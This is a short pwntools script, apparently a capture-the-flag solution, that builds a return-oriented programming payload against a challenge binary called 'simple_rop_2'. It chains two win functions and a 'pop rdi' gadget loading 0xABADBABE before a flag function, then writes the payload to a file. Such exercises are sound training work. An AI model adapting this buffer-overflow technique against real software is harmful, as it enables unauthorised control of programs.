from pwn import *
# input correction
elf = ELF("simple_rop_2")
rop = ROP(elf)
win1 = elf.symbols['win_function1']
win2 = elf.symbols['win_function2']
flag = elf.symbols['flag']
POP_ONCE = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

padding = b'A' * 24

exploit = padding + p64(win1) + p64(win2)
exploit += p64(POP_ONCE) + p64(0xABADBABE) + p64(RET) + p64(flag)

print("%x" % (win1))
# rop is saved as input
f = open("input", "wb")
f.write(exploit)
f.close()
